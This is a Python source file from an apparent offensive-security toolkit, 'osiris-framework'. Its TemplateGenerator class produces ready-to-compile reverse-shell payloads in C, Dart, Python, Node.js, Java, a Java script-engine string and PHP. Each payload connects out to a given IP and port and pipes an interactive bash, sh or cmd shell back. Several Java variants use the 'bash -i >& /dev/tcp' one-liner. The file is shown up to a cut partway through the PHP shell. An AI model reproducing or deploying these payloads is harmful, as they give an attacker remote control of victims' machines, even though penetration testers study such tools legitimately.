#!/usr/bin/env python3
# Project: osiris-framework
# Author: Samir Sanchez Garnica @sasaga92
# Version 1.0
# Date: 01/12/2022

from utilities.Colors import color


class TemplateGenerator:
    def __init__(self, **kwargs):
        self.__prompt_windows = "cmd"
        self.__prompt_linux = "/bin/bash"
        self.__prompt = None
        self.__temp_message = None
        self.__platform_allowed = ['linux', 'mac', 'windows']
        self.__type_allowed = ['bind', 'reverse']
        self.__status = {'message': '', 'code': 0}
        self.__payload = None
        self.__target = None
        self.__port = None
        self.__platform = None
        self.__type = None

        for key, value in kwargs.items():
            self.__target = kwargs.get('target') if (kwargs.get('target') is not None) else False
            self.__port = str(kwargs.get('port')) if (kwargs.get('port') is not None) else False
            self.__platform = kwargs.get('platform') if (kwargs.get('platform') is not None) else False
            self.__type = kwargs.get('type') if (kwargs.get('type') is not None) else False

    def validate_parameters(self):
        self.__temp_message = ""
        if not self.__target:
            self.__temp_message += color.color("lgray", "the parameter ") + color.color("yellow", "{") + color.color(
                "green", "target") + color.color("yellow", "}") + color.color("lgray", " is a mandatory ")
        if not self.__port:
            self.__temp_message += color.color("lgray", "the parameter ") + color.color("yellow", "{") + color.color(
                "green", "port") + color.color("yellow", "}") + color.color("lgray", " is a mandatory ")
        if not self.__platform:
            self.__temp_message += color.color("lgray", "the parameter ") + color.color("yellow", "{") + color.color(
                "green", "platform") + color.color("yellow", "}") + color.color("lgray", " is a mandatory ")
        if not self.__type:
            self.__temp_message += color.color("lgray", "the parameter ") + color.color("yellow", "{") + color.color(
                "green", "type") + color.color("yellow", "}") + color.color("lgray", " is a mandatory ")

        if len(self.__temp_message) > 0:
            self.__status['code'] = 500
            self.__status['message'] = self.__temp_message

        else:
            self.__status['code'] = 200

        return self.__status

    def validate_parameter_linux(self):
        self.__temp_message = ""
        if not self.__platform.lower() in self.__platform_allowed or not "linux" in self.__platform.lower():
            self.__temp_message += color.color("lgray", "Platform ") + color.color("yellow", "{") + color.color("green",
                                                                                                                self.__platform) + color.color(
                "yellow", "}") + color.color("lgray", " not allowed for this payloads")

        if len(self.__temp_message) > 0:
            self.__status['code'] = 500
            self.__status['message'] = self.__temp_message

        else:
            self.__status['code'] = 200

        return self.__status

    def validate_parameter_windows(self):
        self.__temp_message = ""
        if not self.__platform.lower() in self.__platform_allowed or not "windows" in self.__platform.lower():
            self.__temp_message += color.color("lgray", "Platform ") + color.color("yellow", "{") + color.color("green",
                                                                                                                self.__platform) + color.color(
                "yellow", "}") + color.color("lgray", " not allowed for this payloads")

        if len(self.__temp_message) > 0:
            self.__status['code'] = 500
            self.__status['message'] = self.__temp_message

        else:
            self.__status['code'] = 200

        return self.__status

    def validate_parameter_mac(self):
        self.__temp_message = ""
        if not self.__platform.lower() in self.__platform_allowed or not "mac" in self.__platform.lower():
            self.__temp_message += color.color("lgray", "Platform ") + color.color("yellow", "{") + color.color("green",
                                                                                                                self.__platform) + color.color(
                "yellow", "}") + color.color("lgray", " not allowed for this payloads")

        if len(self.__temp_message) > 0:
            self.__status['code'] = 500
            self.__status['message'] = self.__temp_message

        else:
            self.__status['code'] = 200

        return self.__status

    def validate_parameter_type_bind(self):
        self.__temp_message = ""
        if not self.__type.lower() in self.__type_allowed or not 'bind' in self.__type.lower():
            self.__temp_message += color.color("lgray", "Type payload ") + color.color("yellow", "{") + color.color(
                "green",
                self.__type) + color.color(
                "yellow", "}") + color.color("lgray", " not allowed for this payloads")

        if len(self.__temp_message) > 0:
            self.__status['code'] = 500
            self.__status['message'] = self.__temp_message

        else:
            self.__status['code'] = 200

        return self.__status

    def validate_parameter_type_reverse(self):
        self.__temp_message = ""
        if not self.__type.lower() in self.__type_allowed or not 'reverse' in self.__type.lower():
            self.__temp_message += color.color("lgray", "Type payload ") + color.color("yellow", "{") + color.color(
                "green",
                self.__type) + color.color(
                "yellow", "}") + color.color("lgray", " not allowed for this payloads")

        if len(self.__temp_message) > 0:
            self.__status['code'] = 500
            self.__status['message'] = self.__temp_message

        else:
            self.__status['code'] = 200

        return self.__status

    def C(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:

            try:
                self.__payload = "#include <stdio.h>\n" \
                                 "#include <sys/socket.h>\n" \
                                 "#include <sys/types.h>\n" \
                                 "#include <stdlib.h>\n" \
                                 "#include <unistd.h>\n" \
                                 "#include <netinet/in.h>\n" \
                                 "#include <arpa/inet.h>\n" \
                                 "\n" \
                                 "int main(void){\n" \
                                 "    int port = " + self.__port + ";\n" \
                                                                   "    struct sockaddr_in revsockaddr;\n" \
                                                                   "\n" \
                                                                   "    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n" \
                                                                   "    revsockaddr.sin_family = AF_INET;\n" \
                                                                   "    revsockaddr.sin_port = htons(port);\n" \
                                                                   "    revsockaddr.sin_addr.s_addr = inet_addr(\"" + self.__target + "\");\n" \
                                                                                                                                      "\n" \
                                                                                                                                      "    connect(sockt, (struct sockaddr *) &revsockaddr,\n" \
                                                                                                                                      "    sizeof(revsockaddr));\n" \
                                                                                                                                      "    dup2(sockt, 0);\n" \
                                                                                                                                      "    dup2(sockt, 1);\n" \
                                                                                                                                      "    dup2(sockt, 2);\n" \
                                                                                                                                      "\n" \
                                                                                                                                      "    char * const argv[] = {\"/bin/bash\", NULL};\n" \
                                                                                                                                      "    execve(\"/bin/bash\", argv, NULL);\n" \
                                                                                                                                      "    return 0;\n" \
                                                                                                                                      "}"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        elif self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "#include <winsock2.h>\n" \
                                 "#include <stdio.h>\n" \
                                 "#pragma comment(lib,\"ws2_32\")\n" \
                                 "\n" \
                                 "WSADATA wsaData;\n" \
                                 "SOCKET Winsock;\n" \
                                 "struct sockaddr_in hax; \n" \
                                 "char ip_addr[16] = \"" + self.__target + "\"; \n" \
                                                                           "char port[6] = \"" + self.__port + "\";            \n" \
                                                                                                               "\n" \
                                                                                                               "STARTUPINFO ini_processo;\n" \
                                                                                                               "\n" \
                                                                                                               "PROCESS_INFORMATION processo_info;\n" \
                                                                                                               "\n" \
                                                                                                               "int main()\n" \
                                                                                                               "{\n" \
                                                                                                               "    WSAStartup(MAKEWORD(2, 2), &wsaData);\n" \
                                                                                                               "    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);\n" \
                                                                                                               "\n" \
                                                                                                               "\n" \
                                                                                                               "    struct hostent *host; \n" \
                                                                                                               "    host = gethostbyname(ip_addr);\n" \
                                                                                                               "    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));\n" \
                                                                                                               "\n" \
                                                                                                               "    hax.sin_family = AF_INET;\n" \
                                                                                                               "    hax.sin_port = htons(atoi(port));\n" \
                                                                                                               "    hax.sin_addr.s_addr = inet_addr(ip_addr);\n" \
                                                                                                               "\n" \
                                                                                                               "    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\n" \
                                                                                                               "\n" \
                                                                                                               "    memset(&ini_processo, 0, sizeof(ini_processo));\n" \
                                                                                                               "    ini_processo.cb = sizeof(ini_processo);\n" \
                                                                                                               "    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \n" \
                                                                                                               "    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\n" \
                                                                                                               "\n" \
                                                                                                               "    TCHAR cmd[255] = TEXT(\"cmd.exe\");\n" \
                                                                                                               "\n" \
                                                                                                               "    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\n" \
                                                                                                               "\n" \
                                                                                                               "    return 0;\n" \
                                                                                                               "}\n"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))

        return self.__status
    def C_Mips(self):
        """
            Description: This payload support GNU/Linux, Mac OSX and Mipsle
        """
        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and self.validate_parameter_type_reverse()['code'] == 200:

            try:
                self.__payload = f'''#include <sys/types.h>
                                     #include <sys/socket.h>
                                     #include <sys/wait.h>
                                     #include <netinet/in.h>
                                     #include <arpa/inet.h>
                                     #include <errno.h>
                                     #include <stdio.h>
                                     #include <stdlib.h>
                                     #include <string.h>
                                     #include <unistd.h>
                                    
                                     int main(){{ 
                                    
                                         int socket_info;
                                         int connectie;
                                         int pid;
                                         struct sockaddr_in aanvaller_info;
                                    
                                         while(1){{
                                             socket_info = socket(AF_INET, SOCK_STREAM, 0);
                                             aanvaller_info.sin_family = AF_INET;
                                             aanvaller_info.sin_port = htons({self.__port});
                                             aanvaller_info.sin_addr.s_addr = inet_addr("{self.__target}");
                                             printf("Set data.\\n");
                                            
                                             printf("Trying to perform a new connection\\n");
                                             connectie = connect(socket_info, (struct sockaddr *)&aanvaller_info, sizeof(struct sockaddr));
                                             while(connectie < 0){{
                                                 printf("Connection Failed\\n");
                                                 sleep(5);
                                                 connectie = connect(socket_info, (struct sockaddr *)&aanvaller_info, sizeof(struct sockaddr));
                                             }}
                                             connectie = write(socket_info,"Connection Completed\\n",36);
                                            
                                             printf("Successful Connection\\n");
                                            
                                             pid = fork();
                                             if(pid > 0){{
                                                 printf("Forking Process\\n");
                                                 wait(NULL);
                                             }}
                                             if(pid == 0){{
                                                 printf("Process Forked Successfully\\n");
                                                 dup2(socket_info,0); // input
                                                 dup2(socket_info,1); // output
                                                 dup2(socket_info,2); // errors
                                                 execl("/bin/sh", "/bin/sh", NULL);
                                                 usleep(3000);
                                             }}
                                             printf("The connection was closed, trying to reconnect...\\n");
                                         
                                         }}
                                     
                                         return 0;
                                     }}
                                    '''

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        elif self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "#include <winsock2.h>\n" \
                                 "#include <stdio.h>\n" \
                                 "#pragma comment(lib,\"ws2_32\")\n" \
                                 "\n" \
                                 "WSADATA wsaData;\n" \
                                 "SOCKET Winsock;\n" \
                                 "struct sockaddr_in hax; \n" \
                                 "char ip_addr[16] = \"" + self.__target + "\"; \n" \
                                                                           "char port[6] = \"" + self.__port + "\";            \n" \
                                                                                                               "\n" \
                                                                                                               "STARTUPINFO ini_processo;\n" \
                                                                                                               "\n" \
                                                                                                               "PROCESS_INFORMATION processo_info;\n" \
                                                                                                               "\n" \
                                                                                                               "int main()\n" \
                                                                                                               "{\n" \
                                                                                                               "    WSAStartup(MAKEWORD(2, 2), &wsaData);\n" \
                                                                                                               "    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);\n" \
                                                                                                               "\n" \
                                                                                                               "\n" \
                                                                                                               "    struct hostent *host; \n" \
                                                                                                               "    host = gethostbyname(ip_addr);\n" \
                                                                                                               "    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));\n" \
                                                                                                               "\n" \
                                                                                                               "    hax.sin_family = AF_INET;\n" \
                                                                                                               "    hax.sin_port = htons(atoi(port));\n" \
                                                                                                               "    hax.sin_addr.s_addr = inet_addr(ip_addr);\n" \
                                                                                                               "\n" \
                                                                                                               "    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\n" \
                                                                                                               "\n" \
                                                                                                               "    memset(&ini_processo, 0, sizeof(ini_processo));\n" \
                                                                                                               "    ini_processo.cb = sizeof(ini_processo);\n" \
                                                                                                               "    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \n" \
                                                                                                               "    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\n" \
                                                                                                               "\n" \
                                                                                                               "    TCHAR cmd[255] = TEXT(\"cmd.exe\");\n" \
                                                                                                               "\n" \
                                                                                                               "    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\n" \
                                                                                                               "\n" \
                                                                                                               "    return 0;\n" \
                                                                                                               "}\n"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))

        return self.__status

    def Dart(self):
        """
            Description: This payload support GNU/Linux Mac OSX, and Microsoft Windows
        """
        self.__prompt = self.__prompt_linux if (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) else self.__prompt_windows

        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 or
                self.validate_parameter_windows()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "import \'dart:io\';\n" \
                                 "import \'dart:convert\';\n" \
                                 " \n" \
                                 "main() {\n" \
                                 "  Socket.connect(\"" + self.__target + "\", " + self.__port + ").then((socket) {\n" \
                                                                                                "    socket.listen((data) {\n" \
                                                                                                "      Process.start(\'"+self.__prompt+"\', []).then((Process process) {\n" \
                                                                                                "        process.stdin.writeln(new String.fromCharCodes(data).trim());\n" \
                                                                                                "        process.stdout\n" \
                                                                                                "          .transform(utf8.decoder)\n" \
                                                                                                "          .listen((output) { socket.write(output); });\n" \
                                                                                                "      });\n" \
                                                                                                "    },\n" \
                                                                                                "    onDone: () {\n" \
                                                                                                "      socket.destroy();\n" \
                                                                                                "    });\n" \
                                                                                                "  });\n" \
                                                                                                "}\n"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def Python3_windows(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "import os,socket,subprocess,threading;\n" \
                                  "def s2p(s, p):\n" \
                                  "    while True:\n" \
                                  "        data = s.recv(1024)\n" \
                                  "        if len(data) > 0:\n" \
                                  "            p.stdin.write(data)\n" \
                                  "            p.stdin.flush()\n" \
                                  "\n" \
                                  "def p2s(s, p):\n" \
                                  "    while True:\n" \
                                  "        s.send(p.stdout.read(1))\n" \
                                  "\n" \
                                  "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n" \
                                  "s.connect((\""+self.__target+"\","+self.__port+"))\n" \
                                  "\n" \
                                  "p=subprocess.Popen([\"cmd\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\n" \
                                  "\n" \
                                  "s2p_thread = threading.Thread(target=s2p, args=[s, p])\n" \
                                  "s2p_thread.daemon = True\n" \
                                  "s2p_thread.start()\n" \
                                  "\n" \
                                  "p2s_thread = threading.Thread(target=p2s, \ args=[s, p])\n" \
                                  "p2s_thread.daemon = True\n" \
                                  "p2s_thread.start()\n" \
                                  "\n" \
                                  "try:\n" \
                                  "    p.wait()\n" \
                                  "except KeyboardInterrupt:\n" \
                                  "    s.close()\n"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def Nodejs(self):
        """
            Description: This payload support GNU/Linux, Mac OSX and Microsoft Windows
        """
        self.__prompt = self.__prompt_linux if (
                    self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) else self.__prompt_windows

        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 or
                self.validate_parameter_windows()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "(function(){\n" \
                                 "   var net = require(\"net\"),\n" \
                                 "       cp = require(\"child_process\"),\n" \
                                 "       sh = cp.spawn(\""+self.__prompt+"\", []);\n" \
                                 "    var client = new net.Socket();\n" \
                                 "   client.connect(" + self.__port + ", \"" + self.__target + "\", function(){\n" \
                                                                                               "        client.pipe(sh.stdin);\n" \
                                                                                               "        sh.stdout.pipe(client);\n" \
                                                                                               "        sh.stderr.pipe(client);\n" \
                                                                                               "    });\n" \
                                                                                               "    return /a/; // Prevents the Node.js application from crashing\n" \
                                                                                               "})();\n"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def Java(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "public class shell {\n" \
                                 "    public static void main(String[] args) {\n" \
                                 "        Process p;\n" \
                                 "        try {\n" \
                                 "            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/" + self.__target + "/" + self.__port + " 0>&1\");\n" \
                                                                                                                                                                 "            p.waitFor();\n" \
                                                                                                                                                                 "            p.destroy();\n" \
                                                                                                                                                                 "        } catch (Exception e) {}\n" \
                                                                                                                                                                 "    }\n" \
                                                                                                                                                                 "}"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def Java_2(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "public class shell {\n" \
                                 "    public static void main(String[] args) {\n" \
                                 "        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/" + self.__target + "/" + self.__port + " 0>&1\")\n" \
                                                                                                                                                                     "            .redirectErrorStream(true);\n" \
                                                                                                                                                                     "        try {\n" \
                                                                                                                                                                     "            Process p = pb.start();\n" \
                                                                                                                                                                     "            p.waitFor();\n" \
                                                                                                                                                                     "            p.destroy();\n" \
                                                                                                                                                                     "        } catch (Exception e) {}\n" \
                                                                                                                                                                     "    }\n" \
                                                                                                                                                                     "}\n"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def Java_3(self):
        """
            Description: This payload support GNU/Linux, Mac OSX and Microsoft Windows
        """
        self.__prompt = self.__prompt_linux if (
                    self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) else self.__prompt_windows

        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 or
                self.validate_parameter_windows()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "import java.io.InputStream;\n" \
                                 "import java.io.OutputStream;\n" \
                                 "import java.net.Socket;\n" \
                                 "\n" \
                                 "public class shell {\n" \
                                 "    public static void main(String[] args) {\n" \
                                 "        String host = \"" + self.__target + "\";\n" \
                                                                              "        int port = " + self.__port + ";\n" \
                                                                                                                    "        String cmd = \""+self.__prompt+"\";\n" \
                                                                                                                    "        try {\n" \
                                                                                                                    "            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n" \
                                                                                                                    "            Socket s = new Socket(host, port);\n" \
                                                                                                                    "            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n" \
                                                                                                                    "            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n" \
                                                                                                                    "            while (!s.isClosed()) {\n" \
                                                                                                                    "                while (pi.available() > 0)\n" \
                                                                                                                    "                    so.write(pi.read());\n" \
                                                                                                                    "                while (pe.available() > 0)\n" \
                                                                                                                    "                    so.write(pe.read());\n" \
                                                                                                                    "                while (si.available() > 0)\n" \
                                                                                                                    "                    po.write(si.read());\n" \
                                                                                                                    "                so.flush();\n" \
                                                                                                                    "                po.flush();\n" \
                                                                                                                    "                Thread.sleep(50);\n" \
                                                                                                                    "                try {\n" \
                                                                                                                    "                    p.exitValue();\n" \
                                                                                                                    "                    break;\n" \
                                                                                                                    "                } catch (Exception e) {}\n" \
                                                                                                                    "            }\n" \
                                                                                                                    "            p.destroy();\n" \
                                                                                                                    "            s.close();\n" \
                                                                                                                    "        } catch (Exception e) {}\n" \
                                                                                                                    "    }\n" \
                                                                                                                    "}\n"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def Javascript(self):
        """
            Description: This payload support GNU/Linux, Mac OSX and Microsoft Windows
        """
        self.__prompt = self.__prompt_linux if (
                    self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) else self.__prompt_windows

        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 or
                self.validate_parameter_windows()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "String command = \"var host = \'" + self.__target + "\';  \" +\n \
                           \"var port = " + self.__port + "; \" +\n" " \
                           \"var cmd = \'"+self.__prompt+"\'; \" +\n" "\
                           \"var s = new java.net.Socket(host, port); \" +\n" " \
                           \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start(); \" +\n" " \
                           \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); \" +\n" " \
                           \"var po = p.getOutputStream(), so = s.getOutputStream(); \" +\n" " \
                           \"print (\'Connected\'); \" +\n" " \
                           \"while (!s.isClosed()) {\" +\n" " \
                           \"    while (pi.available() > 0)\" +\n" " \
                           \"        so.write(pi.read()); \" +\n" " \
                           \"    while (pe.available() > 0)\" +\n" " \
                           \"        so.write(pe.read()); \" +\n" " \
                           \"    while (si.available() > 0)\" +\n" " \
                           \"        po.write(si.read()); \" +\n" " \
                           \"    so.flush(); \" +\n" " \
                           \"    po.flush(); \" +\n" " \
                           \"    java.lang.Thread.sleep(50); \" +\n" " \
                           \"    try {\" +\n" " \
                           \"        p.exitValue(); \" +\n" " \
                           \"        break; \" +\n" " \
                           \"    }\" +\n" " \
                           \"    catch(e){\" +\n" " \
                           \"    }\" +\n" " \
                           \"}\" +\n" " \
                           \"p.destroy(); \" +\n" " \
                           \"s.close();\";\n" \
                                                          "String x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\");\n" \
                                                          "ref.add(new StringRefAddr(\"x\", x);"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def PHP(self):
        """
            Description: This payload support GNU/Linux, Mac OSX and Microsoft Windows
        """
        self.__prompt = self.__prompt_linux if (self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 ) else self.__prompt_windows

        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 or self.validate_parameter_windows()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "<?php\n" \
                                 "// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n" \
                                 "// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n" \
                                 "\n" \
                                 "set_time_limit (0);\n" \
                                 "$VERSION = \"1.0\";\n" \
                                 "$ip = \'" + self.__target + "\';\n" \
                                                              "$port = " + self.__port + ";\n" \
                                                                                         "$chunk_size = 1400;\n" \
                                                                                         "$write_a = null;\n" \
                                                                                         "$error_a = null;\n" \
                                                                                         "$shell = \'uname -a; w; id; "+self.__prompt+" -i\';\n" \
                                                                                         "$daemon = 0;\n" \
                                                                                         "$debug = 0;\n" \
                                                                                         "\n" \
                                                                                         "if (function_exists(\'pcntl_fork\')) {\n" \
                                                                                         "    $pid = pcntl_fork();\n" \
                                                                                         "\n" \
                                                                                         "    if ($pid == -1) {\n" \
                                                                                         "        printit(\"ERROR: Can\'t fork\");\n" \
                                                                                         "        exit(1);\n" \
                                                                                         "    }\n" \
                                                                                         "\n" \
                                                                                         "    if ($pid) {\n" \
                                                                                         "        exit(0); // Parent exits\n" \
                                                                                         "    }\n" \
                                                                                         "    if (posix_setsid() == -1) { \n" \
                                                                                         "        printit(\"Error: Can\'t setsid()\");\n" \
                                                                                         "        exit(1);\n" \
                                                                                         "    }\n" \
                                                                                         "\n" \
                                                                                         "    $daemon = 1;\n" \
                                                                                         "} else {\n" \
                                                                                         "    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n" \
                                                                                         "}\n" \
                                                                                         "\n" \
                                                                                         "chdir(\"/\");\n" \
                                                                                         "\n" \
                                                                                         "umask(0);\n" \
                                                                                         "\n" \
                                                                                         "// Open reverse connection\n" \
                                                                                         "$sock = fsockopen($ip, $port, $errno, $errstr, 30);\n" \
                                                                                         "if (!$sock) {\n" \
                                                                                         "	printit(\"$errstr ($errno)\");\n" \
                                                                                         "	exit(1);\n" \
                                                                                         "}\n" \
                                                                                         "\n" \
                                                                                         "$descriptorspec = array(\n" \
                                                                                         "   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n" \
                                                                                         "   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n" \
                                                                                         "   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n" \
                                                                                         ");\n" \
                                                                                         "\n" \
                                                                                         "$process = proc_open($shell, $descriptorspec, $pipes);\n" \
                                                                                         "\n" \
                                                                                         "if (!is_resource($process)) {\n" \
                                                                                         "	printit(\"ERROR: Can\'t spawn shell\");\n" \
                                                                                         "	exit(1);\n" \
                                                                                         "}\n" \
                                                                                         "\n" \
                                                                                         "stream_set_blocking($pipes[0], 0);\n" \
                                                                                         "stream_set_blocking($pipes[1], 0);\n" \
                                                                                         "stream_set_blocking($pipes[2], 0);\n" \
                                                                                         "stream_set_blocking($sock, 0);\n" \
                                                                                         "\n" \
                                                                                         "printit(\"Successfully opened reverse shell to $ip:$port\");\n" \
                                                                                         "\n" \
                                                                                         "while (1) {\n" \
                                                                                         "	if (feof($sock)) {\n" \
                                                                                         "		printit(\"ERROR: Shell connection terminated\");\n" \
                                                                                         "		break;\n" \
                                                                                         "	}\n" \
                                                                                         "\n" \
                                                                                         "	if (feof($pipes[1])) {\n" \
                                                                                         "		printit(\"ERROR: Shell process terminated\");\n" \
                                                                                         "		break;\n" \
                                                                                         "	}\n" \
                                                                                         "\n" \
                                                                                         "$read_a = array($sock, $pipes[1], $pipes[2]);\n" \
                                                                                         "	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n" \
                                                                                         "\n" \
                                                                                         "	if (in_array($sock, $read_a)) {\n" \
                                                                                         "	if ($debug) printit(\"SOCK READ\");\n" \
                                                                                         "		$input = fread($sock, $chunk_size);\n" \
                                                                                         "	if ($debug) printit(\"SOCK: $input\");\n" \
                                                                                         "		fwrite($pipes[0], $input);\n" \
                                                                                         "	}\n" \
                                                                                         "\n" \
